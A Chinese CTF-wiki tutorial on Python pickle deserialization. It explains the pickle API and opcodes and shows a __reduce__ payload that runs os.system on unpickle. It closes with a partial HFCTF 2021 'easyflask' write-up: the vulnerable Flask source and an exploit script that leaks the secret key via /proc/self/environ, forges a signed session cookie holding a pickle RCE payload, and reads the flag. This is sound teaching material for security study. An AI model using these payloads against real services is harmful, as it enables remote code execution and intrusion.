# Python Pickle反序列化
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 



## Pickle/CPickle

*`pickle`或`cPickle`，作用和`PHP的serialize与unserialize`一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好,之后就以pickle库来进行演示。*

### Pickle库及函数

**pickle是python语言的一个标准模块，实现了基本的数据序列化和反序列化。*
 pickle模块是以二进制的形式序列化后保存到文件中（保存文件的后缀为`.pkl`），不能直接打开进行预览。*

```
#序列化
pickle.dump(obj, file, protocol=None,)
obj表示要进行封装的对象(必填参数）
file表示obj要写入的文件对象
以二进制可写模式打开即wb(必填参数）
#反序列化
pickle.load(file, *, fix_imports=True, encoding="ASCII", errors="strict", buffers=None)
file文件中读取封存后的对象
以二进制可读模式打开即rb(必填参数)
#序列化
pickle.dumps(obj, protocol=None,*,fix_imports=True)
dumps()方法不需要写入文件中，直接返回一个序列化的bytes对象。
#反序列化
pickle.loads(bytes_object, *,fix_imports=True, encoding="ASCII". errors="strict")
loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。
————————————————
版权声明：本文为CSDN博主「Sn0w/」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/qq_43431158/article/details/108919605
```

```
import pickle
import os
class A(object):
    def __init__(self,a,b):
        self.a=a
        self.b=b
if __name__ == '__main__':
    AA = A('1','2')
    print(AA)
    print('-----------------------------------------')

    strings = pickle.dumps(AA)
    print(strings)
    print("序列化后")
    print('-----------------------------------------')
    data = pickle.loads(strings)
    print(data)
    print("反序列化")
    print('-----------------------------------------')


```

然后执行出来的结果（py3被编码，更为直观，建议采用py2）：

![1](Pickle反序列化.assets/1.png)

![2](Pickle反序列化.assets/2-1625833872866.png)



## PVM

*对于Python而言，它可以直接从源代码运行程序。Python解释器会将源代码编译为字节码，然后将编译后的字节码转发到Python虚拟机中执行。总的来说，PVM的作用便是用来解释字节码的解释引擎。*

理解起来就是类似虚拟机中编译执行py程序

#### Pickle是一门基于栈的编程语言 , 有不同的编写方式 , 其本质就是一个轻量级的 PVM .

摘自网络：

```
c : 读取本行的内容作为模块名module, 读取下一行的内容作为对象名object，然后将 module.object 作为可调用对象压入到栈中
( : 将一个标记对象压入到栈中 , 用于确定命令执行的位置 . 该标记常常搭配 t 指令一起使用 , 以便产生一个元组
S : 后面跟字符串 , PVM会读取引号中的内容 , 直到遇见换行符 , 然后将读取到的内容压入到栈中
t : 从栈中不断弹出数据 , 弹射顺序与压栈时相同 , 直到弹出左括号 . 此时弹出的内容形成了一个元组 , 然后 , 该元组会被压入栈中
R : 将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用参数的对象并执行该对象 。最后将结果压入到栈中
. : 结束整个 Pickle 反序列化过程
```

![在这里插入图片描述](Pickle反序列化.assets/20201004200811277.gif)

![在这里插入图片描述](Pickle反序列化.assets/20201010102851640.png)

整个序列化的过程可以分为三个步骤

1. 从对象中提权所有属性
2. 写入对象的所有模块名和类名
3. 写入对象所有属性的键值对

反序列化的过程就是序列化过程的逆过程。

## Pickle/CPickle反序列化漏洞分析

反序列化漏洞出现在 `__reduce__()`魔法函数上，这一点和PHP中的`__wakeup()` 魔术方法类似，都是因为每当反序列化过程开始或者结束时 , 都会自动调用这类函数。而这恰好是反序列化漏洞经常出现的地方。

而且在反序列化过程中，因为编程语言需要根据反序列化字符串去解析出自己独特的语言数据结构，所以就必须要在内部把解析出来的结构去执行一下。如果在反序列化过程中出现问题，便可能直接造成RCE漏洞.

另外pickle.loads会解决import 问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数都可以进行使用。
https://docs.python.org/3.7/library/pickle.html

![在这里插入图片描述](Pickle反序列化.assets/20201004203224544.png)



*将之前压入栈中的元组和可调用对象全部弹出 , 然后将该元组作为可调用参数的对象并**执行**该对象 。最后将结果压入到栈中* 

事实上 , `R`操作码就是 `__reduce__()` 魔术函数的底层实现 . 而在反序列化过程结束的时候 , Python 进程会自动调用 `__reduce__()` 魔术方法 . 如果可以控制被调用函数的参数 , Python 进程就可以执行恶意代码 .

在python2中只有内置类才有`__reduce__`方法，即用`class A(object)`声明的类，而`python3`中已经默认都是内置类了

## **漏洞可能出现的位置**

1. 解析认证token、session的时候

2. 将对象Pickle后存储成磁盘文件

3. 将对象Pickle后在网络中传输

4. 参数传递给程序

   什么叫RCE啊

```
import pickle
import os

class Test2(object):
    def __reduce__(self):
    	#被调用函数的参数
        cmd = "ls" 
        return (os.system,(cmd,))

if __name__ == "__main__":
    test = Test2()
    #执行序列化操作
    result1 = pickle.dumps(test)
    #执行反序列化操作
    result2 = pickle.loads(result1)

# __reduce__()魔法方法的返回值:
# return(os.system,(cmd,))
# 1.满足返回一个元组，元组中有两个参数
# 2.第一个参数是被调用函数 : os.system()
# 3.第二个参数是一个元组:(cmd,),元组中被调用的参数 cmd
# 4. 因此序列化时被解析执行的代码是 os.system("/usr/bin/id")
```

![3](Pickle反序列化.assets/3.png)

这个代码执行比Java反序列化要容易很多

## [HFCTF 2021 Final]easyflask

不放完全的题解了：

```
#!/usr/bin/python3.6
import os
import pickle

from base64 import b64decode
from flask import Flask, request, render_template, session

app = Flask(__name__)
app.config["SECRET_KEY"] = "*******"

User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
})


@app.route('/', methods=('GET',))
def index_handler():
    if not session.get('u'):
        u = pickle.dumps(User())
        session['u'] = u
    return "/file?file=index.js"


@app.route('/file', methods=('GET',))
def file_handler():
    path = request.args.get('file')
    path = os.path.join('static', path)
    if not os.path.exists(path) or os.path.isdir(path) \
            or '.py' in path or '.sh' in path or '..' in path or "flag" in path:
        return 'disallowed'

    with open(path, 'r') as fp:
        content = fp.read()
    return content


@app.route('/admin', methods=('GET',))
def admin_handler():
    try:
        u = session.get('u')
        if isinstance(u, dict):
            u = b64decode(u.get('b'))
        u = pickle.loads(u)
    except Exception:
        return 'uhh?'

    if u.is_admin == 1:
        return 'welcome, admin'
    else:
        return 'who are you?'


if __name__ == '__main__':
    app.run('0.0.0.0', port=80, debug=False)
```

paylaod:

```
import base64
import pickle
from flask.sessions import SecureCookieSessionInterface
import re
import pickletools
import requests

url=""

def get_secret_key():
    target = url + "/file/?file=/proc/self/environ"
    r = requests.get(target)
    key = re.findall('key=(.*?)OLDPWD',r.text)
    return  str(key[0])
secret_key = get_secret_key()

class FakeApp:
    secret_key =secret_key
class User(object):
    def __reduce__(self):
        import os
        cmd = "cat /flag > /tmp/test1"
        return  (os.system,(cmd,))
exp = {"b":base64.b64encode(pickle.dumps(User()))}

print(exp)
fake_app=FakeApp()
session_interface = SecureCookieSessionInterface()
serialize = session_interface.get_signing_serializer(fake_app)
cookie = serialize.dumps({'u':exp})
print(cookie)

headers = {
    "Accept":"*/*",
    "Cookie":"session{0}".format(cookie)
}
req = requests.get(url+"/admin",headers=headers)

req = requests.get(url+"/file?file=/tmp/test1",headers=headers)
print(req.text)
```
